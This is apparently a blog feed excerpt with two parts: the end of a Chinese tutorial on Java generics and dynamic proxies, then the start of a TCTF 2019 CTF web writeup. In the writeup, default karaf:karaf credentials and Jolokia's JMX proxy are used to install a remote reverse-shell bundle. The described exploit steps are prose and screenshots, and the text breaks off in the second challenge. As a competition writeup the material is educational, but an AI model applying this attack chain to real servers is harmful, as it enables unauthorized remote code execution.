<code>Generator&lt;T&gt;</code>，编译器会报错：”Unknown class”</t></p><pre><code>class FruitGenerator&lt;T&gt; implements Generator&lt;T&gt;{    @Override    public T next() {        return null;    }}</code></pre><p>当实现泛型接口的类，传入泛型实参时：定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口<code>Generator&lt;T&gt;</code>但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型,即：<code>Generator&lt;T&gt;</code>，public T next();中的的T都要替换成传入的String类型。</p><pre><code>public class FruitGenerator implements Generator&lt;String&gt; {    private String[] fruits = new String[]{&quot;Apple&quot;, &quot;Banana&quot;, &quot;Pear&quot;};    @Override    public String next() {        Random rand = new Random();        return fruits[rand.nextInt(3)];    }}</code></pre><h4 id="3-泛型通配符”-”"><a href="#3-泛型通配符”-”" class="headerlink" title="(3)泛型通配符”?”"></a><strong>(3)泛型通配符”?”</strong></h4><p>首先我们要明确一点，那就是泛型之间是不存在类型兼容性的，比如说，Ingeter是Number的一个子类，但是在使用 <code>Generic&lt;Number&gt;</code>作为形参的方法中，是不能使用<code>Generic&lt;Ingeter&gt;</code>的实例传入的，换句话说 <code>Generic&lt;Integer&gt;</code> 不能被看作为<code>Generic&lt;Number&gt;</code>的子类</p><p><strong>代码实例：</strong></p><pre><code>public void showKeyValue1(Generic&lt;Number&gt; obj){    System.out.println(&quot;泛型测试 key value is &quot; + obj.getKey());}Generic&lt;Integer&gt; gInteger = new Generic&lt;Integer&gt;(123);Generic&lt;Number&gt; gNumber = new Generic&lt;Number&gt;(456);showKeyValue(gInteger);</code></pre><p>showKeyValue这个方法编译器会为我们报错：<code>Generic&lt;java.lang.Integer&gt;</code> cannot be applied to <code>Generic&lt;java.lang.Number&gt;</code> showKeyValue(gInteger);</p><p>因此我们需要一个在逻辑上可以表示同时是 <code>Generic&lt;Integer&gt;</code> 和 <code>Generic&lt;Number&gt;</code> 父类的引用类型,我们对上面的方法进行如下修改</p><pre><code>public void showKeyValue1(Generic&lt;?&gt; obj){    System.out.println(&quot;泛型测试 key value is &quot; + obj.getKey());}</code></pre><blockquote><p><strong>注意：</strong></p><p>1.这里的 “?” 代替具体的类型<strong>实参</strong>，和Number、String、Integer一样都是一种实际的类型，可以把”?看成所有类型的父类。</p><p>2.可以解决当具体类型不确定的时候，这个通配符就是 “?” 当操作类型时，不需要使用类型的具体功能时，只使用Object类中的功能。那么可以用 “?” 通配符来表未知类型。</p></blockquote><h4 id="4-泛型方法"><a href="#4-泛型方法" class="headerlink" title="(4)泛型方法"></a><strong>(4)泛型方法</strong></h4><h5 id="1-类比泛型类解释泛型方法"><a href="#1-类比泛型类解释泛型方法" class="headerlink" title="1.类比泛型类解释泛型方法"></a><strong>1.类比泛型类解释泛型方法</strong></h5><p>泛型类，是在实例化类的时候指明泛型的具体类型，而泛型方法，是在调用方法的时候指明泛型的具体类型。</p><p><strong>实例代码：</strong></p><pre><code>public &lt;T&gt; T genericMethod(Class&lt;T&gt; tClass)throws InstantiationException ,  IllegalAccessException{        T instance = tClass.newInstance();        return instance;}Object obj = genericMethod(Class.forName(&quot;com.test.test&quot;));</code></pre><p><strong>解释：</strong></p><p> 1）public 与 返回值中间<code>&lt;T&gt;</code>非常重要，可以理解为声明此方法为泛型方法。<br> 2）只有声明了<code>&lt;T&gt;</code>的方法才是泛型方法，泛型类中的使用了泛型的成员方法并不是泛型方法。<br> 3）<t>表明该方法将使用泛型类型T，此时才可以在方法中使用泛型类型T。<br> 4）与泛型类的定义一样，此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型。</t></p><h5 id="2-泛型方法的基本使用"><a href="#2-泛型方法的基本使用" class="headerlink" title="2.泛型方法的基本使用"></a><strong>2.泛型方法的基本使用</strong></h5><pre><code>public class GenericTest {   //这个类是个泛型类，在上面已经介绍过   public class Generic&lt;T&gt;{             private T key;        public Generic(T key) {            this.key = key;        }        //我想说的其实是这个，虽然在方法中使用了泛型，但是这并不是一个泛型方法。        //这只是类中一个普通的成员方法，只不过他的返回值是在声明泛型类已经声明过的泛型。        //所以在这个方法中才可以继续使用 T 这个泛型。        public T getKey(){            return key;        }        /**         * 这个方法显然是有问题的，在编译器会给我们提示这样的错误信息&quot;cannot reslove symbol E&quot;         * 因为在类的声明中并未声明泛型E，所以在使用E做形参和返回值类型时，编译器会无法识别。        public E setKey(E key){             this.key = keu        }        */    }        /**          * 这才是一个真正的泛型方法。         * 首先在public与返回值之间的&lt;T&gt;必不可少，这表明这是一个泛型方法，并且声明了一个泛型T         * 这个T可以出现在这个泛型方法的任意位置.         * 泛型的数量也可以为任意多个          *    如：public &lt;T,K&gt; K showKeyName(Generic&lt;T&gt; container){         *        ...         *        }         */        public &lt;T&gt; T showKeyName(Generic&lt;T&gt; container){            System.out.println(&quot;container key :&quot; + container.getKey());            //当然这个例子举的不太合适，只是为了说明泛型方法的特性。            T test = container.getKey();            return test;        }    }}</code></pre><h5 id="3-泛型类中泛型方法的使用"><a href="#3-泛型类中泛型方法的使用" class="headerlink" title="3.泛型类中泛型方法的使用"></a><strong>3.泛型类中泛型方法的使用</strong></h5><pre><code>public class GenericFruit {    class Fruit{        @Override        public String toString() {            return &quot;fruit&quot;;        }    }    class Apple extends Fruit{        @Override        public String toString() {            return &quot;apple&quot;;        }    }    class Person{        @Override        public String toString() {            return &quot;Person&quot;;        }    }    class GenerateTest&lt;T&gt;{        public void show_1(T t){            System.out.println(t.toString());        }        //在泛型类中声明了一个泛型方法，使用泛型E，这种泛型E可以为任意类型。可以类型与T相同，也可以不同。        //由于泛型方法在声明的时候会声明泛型&lt;E&gt;，因此即使在泛型类中并未声明泛型，编译器也能够正确识别泛型方法中识别的泛型。        public &lt;E&gt; void show_3(E t){            System.out.println(t.toString());        }        //在泛型类中声明了一个泛型方法，使用泛型T，注意这个T是一种全新的类型，可以与泛型类中声明的T不是同一种类型。        public &lt;T&gt; void show_2(T t){            System.out.println(t.toString());        }    }    public static void main(String[] args) {        Apple apple = new Apple();        Person person = new Person();        GenerateTest&lt;Fruit&gt; generateTest = new GenerateTest&lt;Fruit&gt;();        //apple是Fruit的子类，所以这里可以        generateTest.show_1(apple);        //编译器会报错，因为泛型类型实参指定的是Fruit，而传入的实参类是Person        //generateTest.show_1(person);        //使用这两个方法都可以成功        generateTest.show_2(apple);        generateTest.show_2(person);        //使用这两个方法也都可以成功        generateTest.show_3(apple);        generateTest.show_3(person);    }}</code></pre><h5 id="4-静态方法与泛型"><a href="#4-静态方法与泛型" class="headerlink" title="4.静态方法与泛型"></a><strong>4.静态方法与泛型</strong></h5><p>静态方法无法访问类上定义的泛型；如果静态方法要使用泛型的话，必须将静态方法也定义成泛型方法 </p><pre><code>public class StaticGenerator&lt;T&gt; {    ....    ....    /**     * 如果在类中定义使用泛型的静态方法，需要添加额外的泛型声明（将这个方法定义成泛型方法）     * 即使静态方法要使用泛型类中已经声明过的泛型也不可以。     * 如：public static void show(T t){..},此时编译器会提示错误信息：          &quot;StaticGenerator cannot be refrenced from static context&quot;     */    public static &lt;T&gt; void show(T t){    }}</code></pre><h5 id="5-泛型的上下边界"><a href="#5-泛型的上下边界" class="headerlink" title="5.泛型的上下边界"></a><strong>5.泛型的上下边界</strong></h5><p>为泛型添加上边界，即传入的类型实参必须是指定类型的子类型</p><pre><code>public void showKeyValue1(Generic&lt;? extends Number&gt; obj){    System.out.println(&quot;泛型测试 key value is &quot; + obj.getKey());}Generic&lt;String&gt; generic1 = new Generic&lt;String&gt;(&quot;11111&quot;);Generic&lt;Integer&gt; generic2 = new Generic&lt;Integer&gt;(2222);Generic&lt;Float&gt; generic3 = new Generic&lt;Float&gt;(2.4f);Generic&lt;Double&gt; generic4 = new Generic&lt;Double&gt;(2.56);//showKeyValue1(generic1);//这一行代码编译器会提示错误，因为String类型并不是Number类型的子类showKeyValue1(generic2);showKeyValue1(generic3);showKeyValue1(generic4);</code></pre><blockquote><p><strong>注意：</strong></p><p>为泛型方法添加上下边界的时候，必须在权限声明与返回值之间的<code>&lt;T&gt;</code>上添加上下边界，即在泛型声明的时候添加</p><pre><code>//public &lt;T&gt; T showKeyName(Generic&lt;T extends Number&gt; container)，编译器会报错：&quot;Unexpected bound&quot;public &lt;T extends Number&gt; T showKeyName(Generic&lt;T&gt; container){    System.out.println(&quot;container key :&quot; + container.getKey());    T test = container.getKey();    return test;</code></pre></blockquote><h5 id="6-泛型数组"><a href="#6-泛型数组" class="headerlink" title="6.泛型数组"></a><strong>6.泛型数组</strong></h5><p>也就是说下面的这个例子是不可以的：</p><p>List<string>[] ls = new ArrayList<string>[10];  </string></string></p><p>而使用通配符创建泛型数组是可以的，如下面这个例子：</p><p>List&lt;?&gt;[] ls = new ArrayList&lt;?&gt;[10];  </p><p>这样也是可以的：</p><p>List<string>[] ls = new ArrayList[10];</string></p><h2 id="0X02-动态代理"><a href="#0X02-动态代理" class="headerlink" title="0X02 动态代理"></a><strong>0X02 动态代理</strong></h2><h3 id="1-什么是代理"><a href="#1-什么是代理" class="headerlink" title="1.什么是代理"></a><strong>1.什么是代理</strong></h3><p>我想代理这个词对我们从事计算机行业的人来说并不陌生，我们会通过代理去访问国外的一些网站，我们在渗透时通过代理去访问内部网络…代理就是我们与目标的一个中间人，我们想访问目标就要先访问代理，然后代理再代替我们访问目标。</p><h3 id="2-我们为什么需要代理呢"><a href="#2-我们为什么需要代理呢" class="headerlink" title="2.我们为什么需要代理呢"></a><strong>2.我们为什么需要代理呢</strong></h3><p>我们在网络中需要代理是因为我们可能无法直接访问对应的目标，但是这在开发中并不存在，我们不会说访问不到我们自己定义的某一个类，那我们要代理做什么？实际上，我上面说了代理其实是我们与目标的一个中间人，中间人难道只能原封不动的传递信息吗？当然不是，要不就没有中间人攻击了对不对？</p><p>我们这里设置代理实际上是想动态地给我们要访问的对象添加功能，如果我们直接调用 A 对象的 a 方法的话，那就只能运行 a 方法，但是如果我们给 A 对象添加一个代理 ，然后我们在代理类中就可以在 a 方法前面添加 b 方法，在 a 方法后面添加 c 方法，然后我们通过代理类的对象 D 去调用 a 方法的时候就能同时运行 b 和 c 方法，这就是我们添加代理的目的。</p><p>在实际的场景中经常出现在要给某个返回值添加过滤器，那么我们的代理就可以作为一个过滤器，那又有人要问了，为什么不直接在原来的类里面添加过滤器？那是因为如果只有一个类还好说，但是如果有一个“类族” 都要添加过滤器呢？对吧，我们使用代理就能实现一次编写到处使用了。</p><h3 id="3-动态代理和静态代理的区别"><a href="#3-动态代理和静态代理的区别" class="headerlink" title="3.动态代理和静态代理的区别"></a><strong>3.动态代理和静态代理的区别</strong></h3><p>本节的标题是动态代理，那么相对的肯定有静态代理，为了体现动态代理的优势，我们这里还是要介绍一下静态代理的使用方法，然后对比引出动态代理。</p><p>代理的本质是新创建了一个类，这个类要相对于原始类有了更强大的功能，那么静态代理就非常的死板，他必须要实现原始类的接口，因此相当于将原始类硬编译进去了</p><h4 id="1-静态代理的实现"><a href="#1-静态代理的实现" class="headerlink" title="(1)静态代理的实现"></a><strong>(1)静态代理的实现</strong></h4><p>假设，开发者写代码之前并没有写文档的习惯，现在老板要求开发人员必须要在写代码前先写文档，于是我们可以给开发人员的类添加一个代理实现这个功能</p><pre><code>/** * 目标对象实现的接口 */public interface IDeveloper {    public void writeCode();}/** * 目标对象实现类 */public class Developer implements IDeveloper{    private String name;    public Developer(String name){        this.name = name;    }    @Override    public void writeCode() {        System.out.println(&quot;Developer &quot; + name + &quot; writes code&quot;);    }}/** * 代理类，需要实现与目标对象相同的接口来实现目标原始的功能 */public class DeveloperProxy implements IDeveloper{    private IDeveloper developer;    public DeveloperProxy(IDeveloper developer){        this.developer = developer;    }    @Override    public void writeCode() {        System.out.println(&quot;Write documentation...&quot;);        this.developer.writeCode();    }}/** * 最终调用，先去实现原始的类，然后把原始类对象传入代理类创建代理类对象 */public class DeveloperTest {    public static void main(String[] args) {        IDeveloper jerry = new Developer(&quot;Jerry&quot;);        IDeveloper jerryProxy = new DeveloperProxy(jerry);        jerryProxy.writeCode();    }}/** * 运行结果 */Write documentation...Developer jerry writes code</code></pre><h5 id="解释："><a href="#解释：" class="headerlink" title="解释："></a><strong>解释：</strong></h5><p><strong>1.代理类的代码中涉及到了接口类型的对象，实现相同接口的对象可以有不同的动作，实际上这是实现多态的常用手法,下面是一个使用接口实现多态的例子</strong></p><p>(1)定义一个接口TestFace</p><pre><code>public interface TestFace{//定一个接口   void make();//定义一个接口方法}</code></pre><p>(2)定义一个类MyClass，里面包含一个接口型变量</p><pre><code>public class MyClass{//定义一个类    TestFace tf;//定义一个接口型变量tf    public MyClass(TestFace tf){//构造函数初始化接口型变量tf       this.tf = tf;    }    public work(){  //函数调用       this.tf.make();//实际的接口型类实例。    }}</code></pre><p>(3)定义2个类，实现接口TestFace </p><pre><code>public class C1 implements TestFace{//定一个类C1实现接口TestFace    public void make(){//实现接口的方法make       System.out.println(&quot;c1&quot;);//打印c1    }}public class C2 implements TestFace{//定一个类C2实现接口TestFace    public void make(){//实现接口的方法make       System.out.println(&quot;c2&quot;);//打印c2    }}</code></pre><p>(4)使用接口变量</p><pre><code>TestFace tf1 = new C1();//实现一个类实例C1TestFace tf2 = new C2();//实现一个类实例C2MyClass mc = MyClass(tf1);//定义一个MyClass的类实例，使用tf1MyClass mc2 = MyClass(tf2);//定义一个MyClass的类实例，使用tf1//同一个类的work，能够实现不同的打印内容mc.work();mc2.work();</code></pre><p><strong>2.最终调用部分传入的是原始的对象</strong></p><h4 id="2-静态代理方式的缺点"><a href="#2-静态代理方式的缺点" class="headerlink" title="(2)静态代理方式的缺点"></a><strong>(2)静态代理方式的缺点</strong></h4><p>比如我们还想要求测试工程师在进行测试之前也要写文档，那么我们还需要从新编辑我们的代理类，添加我们测试接口</p><pre><code>public interface ITester {    public void doTesting();}public class Tester implements ITester {    private String name;    public Tester(String name){        this.name = name;    }    @Override    public void doTesting() {        System.out.println(&quot;Tester &quot; + name + &quot; is testing code&quot;);    }}public class TesterProxy implements ITester{    private ITester tester;    public TesterProxy(ITester tester){        this.tester = tester;    }    @Override    public void doTesting() {        System.out.println(&quot;Tester is preparing test documentation...&quot;);        tester.doTesting();    }}</code></pre><p>由于静态代理的每次为一个新的类做代理的时候都要实现新的接口，这样这个代理类就太不通用了，代码量就大大提升，所以我们就有了一个新的代理方法，叫做动态代理，这种代理方式不需要去实现所代理的累的接口，使用起来更加方便。</p><h4 id="2-动态代理的实现"><a href="#2-动态代理的实现" class="headerlink" title="(2)动态代理的实现"></a><strong>(2)动态代理的实现</strong></h4><pre><code>  /**     * 代理类，无需实现原始类的接口     */public class EnginnerProxy implements InvocationHandler {    Object obj;    public Object bind(Object obj)    {        this.obj = obj;        return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj        .getClass().getInterfaces(), this);    }    @Override    public Object invoke(Object proxy, Method method, Object[] args)    throws Throwable    {        System.out.println(&quot;Enginner writes document&quot;);        Object res = method.invoke(obj, args);        return res;    }} /** * 新的接口 */public interface ITester {    public void doTesting();}  /** * 新的类 */public class Tester implements ITester {    private String name;    public Tester(String name){        this.name = name;    }    @Override    public void doTesting() {        System.out.println(&quot;Tester &quot; + name + &quot; is testing code&quot;);    }}  /** * 最终调用，先去实现原始的类，然后把原始类对象传入代理类创建代理类对象 */public class DeveloperTest {    public static void main(String[] args) {        IDeveloper jerry = new Developer(&quot;Jerry&quot;);        ITester Tom = new Tester(&quot;Tom&quot;);        IDeveloper jerryProxy = (IDeveloper) new EngineerProxy().bind(jerry);        jerryProxy.writeCode();        ITester TomProxy = (ITester) new EngineerProxy().bind(Tom);        TomProxy.doTesting();    }} /** * 运行结果 */Enginner writes documentDeveloper Jerry writes codeEnginner writes documentTester Tom is testing code</code></pre><h5 id="1-InvocationHandler"><a href="#1-InvocationHandler" class="headerlink" title="1.InvocationHandler"></a><strong>1.InvocationHandler</strong></h5><p>首先我们看到的是 InvocationHandler ，这是 JDK 为我们提供的一个内置接口，从名字就能看出来这是一个调用处理程序的实现接口，因为我们代理类的函数调用实现都是通过内部的一个 invok 方法实现的</p><h5 id="2-newProxyInstance"><a href="#2-newProxyInstance" class="headerlink" title="2.newProxyInstance"></a><strong>2.newProxyInstance</strong></h5><p>newProxyInstance 方法用来返回一个代理对象，它的函数原型:</p><pre><code>static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) </code></pre><p><strong>我们来解释一下这三个参数：</strong></p><p><strong>(1)ClassLoader loader:</strong> 定义了这个新的类的加载器，我们知道每一个类在 javac 编译器编译后都会从 .java 文件转化成对应的 .class 文件(这在我们的反射机制中是比较重要的部分)，加载器的作用就是将 .class 文件中的 虚拟机指令转化成对应的类的字节码</p><p><strong>(2)<code>Class&lt;?&gt;[] interfaces:</code></strong> 用来指明生成的代理对象要实现的接口，这里其实是通过反射的方法去获取的</p><p><strong>(3)InvocationHandler h:</strong> 来指明这个代理对象需要完成的动作，实际上就是 invoke 函数，所以这里用 This 作为实参</p><h5 id="3-invoke"><a href="#3-invoke" class="headerlink" title="3.invoke"></a><strong>3.invoke</strong></h5><p>代理对象调用任何方法都会被这个方法截获，所以这个方法是代理对类的核心方法，它有三个参数，并且这三个参数是在调用过程中自动传入的，无需认为干预</p><p><strong>(1)proxy:</strong>代表我们要代理的原始对象</p><p><strong>(2)method:</strong>我们通过代理对象调用的原对象的方法，这里要注意，如果原始类的方法有很多的话，这里可以使用反射的方式获取到调用的具体方法名，然后写一个判断，从而调用不同的方法</p><pre><code>if(method.getName().equals(&quot;xxx&quot;))</code></pre><p><strong>(3)args:</strong>原对象方法的参数</p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://www.cnblogs.com/jiyukai/p/6958744.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiyukai/p/6958744.html</a><br><a href="https://cloud.tencent.com/developer/article/1185885" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1185885</a><br><a href="https://zhidao.baidu.com/question/342312672.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/342312672.html</a><br><a href="https://www.cnblogs.com/xdp-gacl/p/3971367.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/3971367.html</a><br><a href="https://www.cnblogs.com/xdp-gacl/p/3629723.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/3629723.html</a><br><a href="https://blog.csdn.net/s10461/article/details/53941091" target="_blank" rel="noopener">https://blog.csdn.net/s10461/article/details/53941091</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;最近想写一点关于 Java 的东西，然后又遇见了 Java 中比较
      
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="java 备忘" scheme="https://www.k0rz3n.com/tags/java-%E5%A4%87%E5%BF%98/"/>
    
  </entry>
  
  <entry>
    <title>TCTF 2019 线上赛 web 题 writeup</title>
    <link href="https://www.k0rz3n.com/2019/04/04/TCTF%202019%20%E7%BA%BF%E4%B8%8A%E8%B5%9B%20web%20%E9%A2%98%20writeup/"/>
    <id>https://www.k0rz3n.com/2019/04/04/TCTF 2019 线上赛 web 题 writeup/</id>
    <published>2019-04-04T11:28:18.000Z</published>
    <updated>2019-04-28T15:56:15.232Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>TCTF 2019 来了，2018 年线上赛的几道 CSP 令人记忆犹新，但是当时太菜并做不出来，final 也没有什么 web 题，被教做人，2019 又会有什么样的惊喜呢，又能学到什么新知识呢，简单记录一下解题思路。</p><h2 id="0X01-Ghost-Pepper"><a href="#0X01-Ghost-Pepper" class="headerlink" title="0X01 Ghost Pepper"></a><strong>0X01 Ghost Pepper</strong></h2><h3 id="1-题目概览"><a href="#1-题目概览" class="headerlink" title="1.题目概览"></a><strong>1.题目概览</strong></h3><p>访问页面需要 <a href="https://segmentfault.com/a/1190000004406025//www.freebuf.com/vuls/166695.html" target="_blank" rel="noopener">basic 认证</a>，然后抓包看到响应中有认证的提示</p><pre><code>WWW-Authenticate: BASIC realm=&quot;karaf&quot;</code></pre><p>我们尝试使用 karaf:karaf 登录，发现登录成功</p><a id="more"></a><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp1.png" alt="此处输入图片的描述"></p><p>这应该是第一个提示 ：karaf </p><p>通过阅读<a href="http://karaf.apache.org/manual/latest/#_overview" target="_blank" rel="noopener">官方文档</a>，我们可以发现 karaf 是一个由 OSGI 提供支持的轻量级的容器，可以通过JMX提供管理和操作，同时 Apache Karaf提供了一个JMX MBeanServer。可以使用任何JMX客户端（如jconsole）远程使用此MBeanServer。</p><p>接下来就是带着这些问题去了解什么是 osgi ，例如：osgi 有哪些特性、核心组件是什么</p><p><strong>从<a href="http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">这篇文章</a>中可以得到如下信息：</strong>一个OSGi程序是由一系列OSGi bundles组成的。OSGi bundle 是一个在MANIFEST中带有附加元数据的jar文件。</p><p>目前没有什么其他的信息，这个页面也没有任何服务，只是下面的 powered by 告诉你这是一个 java 的应用程序，并且在搜索了一下以后 jetty 在最近并没有爆出什么严重的漏洞，那么在这种没有任何业务场景的情况下能够出现漏洞的地方应该就是一些 API 接口了，然后我就尝试扫了一下端口，发现除了本身题目的端口以外只开了 22 端口，着很明显是出题人登录服务器用的端口，并不是我们可以利用的条件。</p><p>猜测题目本身也是提示，于是谷歌一番发现 Ghost pepper 和 jolokia 有一定的关系</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp15.png" alt="此处输入图片的描述"></p><p>而 <a href="https://jolokia.org/" target="_blank" rel="noopener">jolokia</a> 存在一个 JMX 代理模式，通过 HTTP 的 JMX(Java Management Extensions) 连接器，提供了类 RESTful 的操作方式，可以通过 POST JSON 的方式访问和修改 JMX 属性、执行 JMX 操作、搜索 MBean、列出 MBean 的 Meta-data 等</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp17.png" alt="此处输入图片的描述"></p><p>根基官方文档提供的方法，简单测试了一下，可以说思路是没问题了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp2.png" alt="此处输入图片的描述"></p><p>然后根据<a href="https://www.freebuf.com/vuls/166695.html" target="_blank" rel="noopener">这篇文章</a>的大概思路，我们知道我们大致有<strong>以下三种攻击思路：</strong></p><p>1.JNDI 注入<br>2.信息泄露<br>3.远程操作 MBeans</p><p>而根据上面的分析，我们大致确定了我们的攻击方向是 通过jolokia 的 JMX 代理模式远程操作 apache karaf 为我们提供的 Mbeans</p><h3 id="2-补充："><a href="#2-补充：" class="headerlink" title="2.补充："></a><strong>2.补充：</strong></h3><h4 id="1-关于-MBean"><a href="#1-关于-MBean" class="headerlink" title="1.关于 MBean"></a><strong>1.关于 MBean</strong></h4><p>MBean 是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，<strong>外界可以获取被管理的资源的状态和操纵MBean的行为</strong>。事实上，MBean就是一个Java Object，同JavaBean模型一样，外界使用自醒和反射来获取Object的值和调用Object的方法，只是MBean更为复杂和高级一些。MBean通过公共方法以及遵从特定的设计模式封装了属性和操作，以便暴露给管理应用程序，详细的的资料<a href="http://karaf.apache.org/manual/latest/#_mbeans" target="_blank" rel="noopener">请看这里</a></p><p>Mbeans 对象有着相同的格式：</p><pre><code>org.apache.karaf:type=[feature],name=[instance]</code></pre><p>安装其他Apache Karaf功能和外部应用程序可以提供新的MBean。</p><p><strong>下面是一些简单的罗列：</strong></p><pre><code>org.apache.karaf:type=bundle,name=*: OSGi bundle 的管理.org.apache.karaf:type=config,name=*: 配置管理.org.apache.karaf:type=diagnostic,name=*: 创建包含当前Apache Karaf活动的转储.org.apache.karaf:type=feature,name=*: Apache Karaf功能的管理.org.apache.karaf:type=http,name=*: HTTP服务的管理（由http功能提供）.org.apache.karaf:type=instance,name=*: 实例的管理 .org.apache.karaf:type=jdbc,name=*: JDBC服务的管理（由jdbc功能提供）.org.apache.karaf:type=jms,name=*: JMS服务的管理（由jms功能提供）.org.apache.karaf:type=jndi,name=*: JNDI服务的管理（由jndi功能提供）.org.apache.karaf:type=kar,name=*: 管理KAR文件.org.apache.karaf:type=log,name=*: 日志服务的管理.org.apache.karaf:type=obr,name=*: 管理OBR服务（由obr功能提供）.org.apache.karaf:type=package,name=*: 有关导出/导入的包的详细信息.org.apache.karaf:type=service,name=*: OSGi服务的管理.org.apache.karaf:type=system,name=*: Apache Karaf容器本身的管理（暂停，重启等）.org.apache.karaf:type=web,name=*: ：WebApplications的管理（由war功能提供）.org.apache.karaf:type=wrapper,name=*: 服务包装器的管理（由包装器功能提供）.</code></pre><h4 id="2-关于-JMX"><a href="#2-关于-JMX" class="headerlink" title="2.关于 JMX"></a><strong>2.关于 JMX</strong></h4><p><strong>JMX的架构是组件式的，被设计为三层：</strong></p><p><strong>1.分布层（Distributed layer）：</strong>包含可以使管理应用与JMX Agents交互的组件。一旦通过交互组件与JMX Agents建立连接，用户可以用管理工具来和注册在Agents中的MBeans进行交互<br><strong>2.代理层（Agent layer ）：</strong>包含JMX Agent以及它们包含的MBean Servers。Agent layer的主要组件是MBean server，作为JMX Agents的核心，它充当MBeans的注册中心。该层提供了4个Agent 服务来使对MBean的管理更容易：计时器（Timer）、监控（monitoring）、动态加载MBean（dynamic MBean loading ）、关系服务（relationship services ）<br><strong>3.指示层（Instrumentation layer）：</strong>包含代表可管理资源的MBeans。该层是最接近管理资源的，它由注册在Agents中的MBeans组成，这个MBean允许通过JMX Agent来管理。每个MBean都暴露出来针对底层资源的操作和访问；</p><h4 id="3-具体的架构分层如下图："><a href="#3-具体的架构分层如下图：" class="headerlink" title="3.具体的架构分层如下图："></a><strong>3.具体的架构分层如下图：</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp14.png" alt="此处输入图片的描述"></p><h4 id="4-jolokia-的语法"><a href="#4-jolokia-的语法" class="headerlink" title="4.jolokia 的语法"></a><strong>4.jolokia 的语法</strong></h4><p>为了能够成功利用这里面的 MBean 我们还必须对 jolokia 的 POST 语法比较熟悉，我们去翻一下<a href="https://jolokia.org/reference/html/protocol.html#request-response" target="_blank" rel="noopener">官方文档</a></p><h3 id="3-开始利用"><a href="#3-开始利用" class="headerlink" title="3.开始利用"></a><strong>3.开始利用</strong></h3><p>根据之前引用的那篇文章，我们现在的思路就是这样，我们需要在 list 列表里面找到一个我们能够引用的 MBean 根据其自带的操作，实现命令执行然后反弹 shell 去读 flag </p><h4 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a><strong>bundle</strong></h4><p>那么既然我们之前已经了解到了 osgi 是依赖于 bundle 的，而且在上面官方文档提供的名单里 bunlde 是那我们就首先看一下 List 列表里面关于 bundle 的信息吧</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp18.png" alt="此处输入图片的描述"></p><p>可以看到这里面的方法还是非常多的，但是最引人注目的还是可以自己安装并开启一个 bundle 了，那么 非常好，我们现在就需要阅读源码，看一下其 install 的步骤，然后我们自己编写一个带有反弹 shell 功能的 bundle 给他安装上，再 strat() 就 ok 了。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp19.png" alt="此处输入图片的描述"></p><p>可以看到，安装的方式非常简单，我们只要传入 jar 包的 url 就可以了，并且值得一提的是在安装以后会自动帮我们调用 start() 函数，这还帮我们省去了一个步骤</p><p>那我们开始构建 bundle 的 jar 包，参考<a href="https://blog.csdn.net/Love_Taylor/article/details/75194394" target="_blank" rel="noopener">这篇文章</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp20.png" alt="此处输入图片的描述"></p><p>我们将 jar 包上传到自己的服务器上，然后使用 json 格式发起请求</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp21.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp23.png" alt="此处输入图片的描述"></p><h2 id="0X02-Wallbreaker-Easy"><a href="#0X02-Wallbreaker-Easy" class="headerlink" title="0X02 Wallbreaker Easy"></a><strong>0X02 Wallbreaker Easy</strong></h2><h3 id="1-题目概览-1"><a href="#1-题目概览-1" class="headerlink" title="1.题目概览"></a><strong>1.题目概览</strong></h3><p>很明显这是一道 Bypass disable_function 的题（一开始都是一个 tmp 目录，后来出题人稍微改了一下）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp7.png" alt="此处输入图片的描述"></p><p>并且出题人给了我们一个受限的 shell</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp4.png" alt="此处输入图片的描述"></p><p>通过这个 shell 我们能看到这个文件是怎么写的</p><pre><code>&lt;?php$dir = &quot;/tmp/&quot; . md5(&quot;$_SERVER[REMOTE_ADDR]&quot;);mkdir($dir);ini_set(&apos;open_basedir&apos;, &apos;/var/www/html:&apos; . $dir);?&gt;&lt;!DOCTYPE 